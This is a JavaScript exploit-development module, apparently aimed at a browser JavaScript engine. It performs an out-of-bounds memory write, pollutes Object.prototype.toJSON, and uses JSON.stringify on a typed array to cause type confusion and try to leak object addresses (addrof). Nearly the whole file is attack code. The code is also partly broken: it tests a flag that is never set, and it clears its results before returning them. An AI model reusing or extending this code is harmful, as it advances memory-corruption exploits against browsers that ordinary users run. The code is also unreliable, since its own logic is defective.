// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v21_ControlConfusedThisBuffer)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB = "OriginalHeisenbug_TypedArrayAddrof_v21_ControlConfusedThisBuffer";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v21 = null;
let object_to_leak_B_v21 = null;
let victim_typed_array_ref_v21 = null; 
let controller_object_ref_v21 = null; // Referência ao objeto que retornamos da P1
let probe_call_count_v21 = 0;
let last_captured_probe_details_v21 = null; // Para o resultado final

function toJSON_TA_Probe_ControlConfusedThisBuffer() {
    probe_call_count_v21++;
    const call_num = probe_call_count_v21;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v21_ControlConfusedThisBuffer",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v21),
        this_is_controller: (this === controller_object_ref_v21 && controller_object_ref_v21 !== null),
        writes_to_victim_buffer_attempted: false,
        writes_to_controller_props_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsController? ${current_call_details.this_is_controller}`, "leak");

    try {
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Returning new controller_object.`, "info");
            controller_object_ref_v21 = { 
                id_marker_v21: "controller_obj_for_v21",
                victim_buffer_ref: victim_typed_array_ref_v21.buffer, // Referência direta ao ArrayBuffer
                leaky_prop_A: null, 
                leaky_prop_B: null,
            };
            // latest_known_probe_details_v21 = current_call_details; // Não precisamos mais disso se focarmos no controller
            return controller_object_ref_v21;
        } else if (current_call_details.this_is_controller) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS controller_object_ref_v21. Current type: ${current_call_details.this_type}`, "info");
            if (current_call_details.this_type === '[object Object]') { // Confusão no controller
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON CONTROLLER OBJECT! Attempting writes...`, "vuln");
                
                // Tentativa 1: Escrever no buffer da vítima através da referência no controller
                if (this.victim_buffer_ref instanceof ArrayBuffer) {
                    logS3(`   Attempting Object.defineProperty on this.victim_buffer_ref[0] & [1]`, "warn");
                    try {
                        // Usar índices que não sejam "0" ou "1" para evitar conflito com propriedades do ArrayBuffer
                        Object.defineProperty(this.victim_buffer_ref, "prop0", { value: object_to_leak_A_v21, configurable: true, enumerable: true, writable: true });
                        Object.defineProperty(this.victim_buffer_ref, "prop1", { value: object_to_leak_B_v21, configurable: true, enumerable: true, writable: true });
                        logS3(`   Object.defineProperty on this.victim_buffer_ref for prop0/prop1 attempted.`, "info");
                        current_call_details.writes_to_victim_buffer_attempted = true; 
                    } catch (e_def) {
                        logS3(`   Error defineProperty on victim_buffer_ref: ${e_def.message}`, "error");
                        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `DefinePropVictimErr: ${e_def.message}; `;
                    }
                } else {
                     logS3(`   this.victim_buffer_ref is not an ArrayBuffer. Type: ${Object.prototype.toString.call(this.victim_buffer_ref)}`, "warn");
                }

                // Tentativa 2: Escrever propriedades no próprio controller (this)
                logS3(`   Attempting to set this.leaky_prop_A and this.leaky_prop_B`, "warn");
                if (object_to_leak_A_v21) this.leaky_prop_A = object_to_leak_A_v21;
                if (object_to_leak_B_v21) this.leaky_prop_B = object_to_leak_B_v21;
                current_call_details.writes_to_controller_props_attempted = true;
                logS3(`   Writes to controller's leaky_prop_A/B attempted. Controller keys: ${Object.keys(this).join(',')}`, "info");
            }
             // Se o controller for chamado novamente, retornar algo diferente para evitar loop profundo nele.
            last_captured_probe_details_v21 = current_call_details; // Captura os detalhes desta interação crucial
            return { controller_processed_marker: call_num, final_keys: Object.keys(this) }; 
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `OuterProbeErr: ${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: UNCAUGHT ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    // Para qualquer outra chamada ou se algo der errado com a lógica acima
    // A última chamada útil terá atualizado last_captured_probe_details_v21
    if (!last_captured_probe_details_v21 && probe_call_count_v21 > 0) { // Se não houve interação com controller ainda
        last_captured_probe_details_v21 = current_call_details;
    }
    return { generic_probe_return_v21: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_ControlConfusedThisBuffer() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ControlConfusedThisBuffer) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB} Init...`;

    probe_call_count_v21 = 0;
    victim_typed_array_ref_v21 = null; 
    controller_object_ref_v21 = null;
    last_captured_probe_details_v21 = null;
    object_to_leak_A_v21 = { marker: "ObjA_TA_v21cctb", id: Date.now() }; 
    object_to_leak_B_v21 = { marker: "ObjB_TA_v21cctb", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
        
    let addrof_A = { success: false, msg: "Addrof A (victim_buffer[0]): Default" }; // Será view[prop0]
    let addrof_B = { success: false, msg: "Addrof B (victim_buffer[1]): Default" }; // Será view[prop1]
    let addrof_Ctrl_A = { success: false, msg: "Addrof Ctrl.leaky_prop_A: Default" };
    let addrof_Ctrl_B = { success: false, msg: "Addrof Ctrl.leaky_prop_B: Default" };
    const fillPattern = 0.21212121212121;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v21 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v21.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v21 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ControlConfusedThisBuffer, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v21); 
            logS3(`  JSON.stringify completed. Stringify Output: ${JSON.stringify(stringifyOutput)}`, "info", FNAME_CURRENT_TEST); // Log completo do stringifyOutput
            logS3(`  Details of probe call targeting controller: ${last_captured_probe_details_v21 ? JSON.stringify(last_captured_probe_details_v21) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnController = false;
            if (last_captured_probe_details_v21 && last_captured_probe_details_v21.this_type === "[object Object]" && last_captured_probe_details_v21.controller_id_match) { // Usa a flag correta
                heisenbugOnController = true;
            }
            
            logS3("STEP 3: Checking victim buffer for addrof via victim_buffer_ref...", "warn", FNAME_CURRENT_TEST);
            // As propriedades "prop0", "prop1" não existem no ArrayBuffer para serem lidas como índices numéricos pela view.
            // Precisamos de uma forma diferente de verificar se Object.defineProperty teve efeito.
            // Por agora, vamos apenas verificar se o buffer foi alterado do fillPattern.
            // Idealmente, precisaríamos de uma forma de ler propriedades nomeadas de um ArrayBuffer, o que não é padrão.

            const val_A_idx0 = float64_view_on_underlying_ab[0]; // Checando se algo inesperado ocorreu em índices numéricos
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A_idx0]).buffer)[0], new Uint32Array(new Float64Array([val_A_idx0]).buffer)[1]);
            if (val_A_idx0 !== (fillPattern + 0) && val_A_idx0 !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A_idx0}`; }
            logS3(`  Value read from victim_buffer[0]: ${val_A_idx0} (${temp_A_int64.toString(true)})`, "leak");


            const val_B_idx1 = float64_view_on_underlying_ab[1];
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B_idx1]).buffer)[0], new Uint32Array(new Float64Array([val_B_idx1]).buffer)[1]);
            if (val_B_idx1 !== (fillPattern + 1) && val_B_idx1 !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B_idx1}`; }
            logS3(`  Value read from victim_buffer[1]: ${val_B_idx1} (${temp_B_int64.toString(true)})`, "leak");


            logS3("STEP 4: Checking stringifyOutput (potentially the controller object)...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput && typeof stringifyOutput === 'object' && stringifyOutput.id_marker_v21 === "controller_obj_for_v21") {
                logS3("  stringifyOutput IS the controller_object.", "info");
                const ctrl_val_A = stringifyOutput.leaky_prop_A;
                const ctrl_val_B = stringifyOutput.leaky_prop_B;

                if (typeof ctrl_val_A === 'number' && ctrl_val_A !==0) { // Checa se é um ponteiro como double
                    let ctrl_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([ctrl_val_A]).buffer)[0], new Uint32Array(new Float64Array([ctrl_val_A]).buffer)[1]);
                    if (ctrl_A_int64.high() < 0x00020000 || (ctrl_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Ctrl_A.success = true; addrof_Ctrl_A.msg = `Possible pointer for leaky_prop_A in controller (stringifyOutput): ${ctrl_A_int64.toString(true)}`;
                    } else { addrof_Ctrl_A.msg = `Controller.leaky_prop_A is number but not pointer-like: ${ctrl_val_A}`; }
                } else if (ctrl_val_A === object_to_leak_A_v21) { // Checa identidade (menos provável para addrof)
                     addrof_Ctrl_A.success = true; addrof_Ctrl_A.msg = "object_to_leak_A_v21 identity found in controller.leaky_prop_A.";
                } else { addrof_Ctrl_A.msg = `Controller.leaky_prop_A not a pointer. Value: ${ctrl_val_A}`; }

                if (typeof ctrl_val_B === 'number' && ctrl_val_B !==0) {
                    let ctrl_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([ctrl_val_B]).buffer)[0], new Uint32Array(new Float64Array([ctrl_val_B]).buffer)[1]);
                     if (ctrl_B_int64.high() < 0x00020000 || (ctrl_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Ctrl_B.success = true; addrof_Ctrl_B.msg = `Possible pointer for leaky_prop_B in controller (stringifyOutput): ${ctrl_B_int64.toString(true)}`;
                    } else { addrof_Ctrl_B.msg = `Controller.leaky_prop_B is number but not pointer-like: ${ctrl_val_B}`; }
                } else if (ctrl_val_B === object_to_leak_B_v21) {
                     addrof_Ctrl_B.success = true; addrof_Ctrl_B.msg = "object_to_leak_B_v21 identity found in controller.leaky_prop_B.";
                } else { addrof_Ctrl_B.msg = `Controller.leaky_prop_B not a pointer. Value: ${ctrl_val_B}`; }
            } else {
                addrof_Ctrl_A.msg = "stringifyOutput was not the controller_object or was null.";
                addrof_Ctrl_B.msg = "stringifyOutput was not the controller_object or was null.";
                logS3(`  stringifyOutput type: ${typeof stringifyOutput}, content: ${JSON.stringify(stringifyOutput)}`, "info");
            }


            if (addrof_A.success || addrof_B.success || addrof_Ctrl_A.success || addrof_Ctrl_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB}: Addr? SUCESSO!`;
            } else if (heisenbugOnController) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB}: Controller TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB}: Controller TC Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V21_CCTB} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v21}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof victim_buffer[0]: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof victim_buffer[1]: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof controller.leaky_prop_A: Success=${addrof_Ctrl_A.success}, Msg='${addrof_Ctrl_A.msg}'`, addrof_Ctrl_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof controller.leaky_prop_B: Success=${addrof_Ctrl_B.success}, Msg='${addrof_Ctrl_B.msg}'`, addrof_Ctrl_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v21 = null; 
        controller_object_ref_v21 = null;
        last_captured_probe_details_v21 = null;
        probe_call_count_v21 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: last_captured_probe_details_v21, 
        total_probe_calls: probe_call_count_v21,
        addrof_victim_A: addrof_A,
        addrof_victim_B: addrof_B,
        addrof_controller_A: addrof_Ctrl_A,
        addrof_controller_B: addrof_Ctrl_B
    };
}
